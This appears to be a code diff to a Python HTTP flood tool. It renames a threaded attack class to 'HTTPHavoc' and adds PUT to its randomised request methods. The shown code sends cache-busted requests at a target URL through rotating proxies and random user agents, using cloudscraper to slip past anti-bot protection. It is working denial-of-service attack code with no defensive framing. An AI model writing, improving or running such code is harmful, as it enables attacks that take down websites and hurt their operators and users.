@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import threading
 import random
 import time
@@ -10,14 +9,13 @@ import requests
 import config
 from utils.network import get_random_proxy, get_random_user_agent
 
-class HTTPMatrix(threading.Thread):
+class HTTPHavoc(threading.Thread):
     def __init__(self, target_url, mode):
         super().__init__()
         self.daemon = True
         self.target_url = target_url
         self.mode = mode
         self.scraper = cloudscraper.create_scraper()
-        self.parsed_target = urlparse(target_url)
 
     def get_attack_params(self):
         delay = 0
@@ -55,7 +53,7 @@ class HTTPMatrix(threading.Thread):
             url_with_cache_bust = f"{self.target_url}?_={random.randint(1, int(1e12))}"
 
             try:
-                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
+                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT'])
                 
                 if method == 'GET':
                     response = self.scraper.get(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
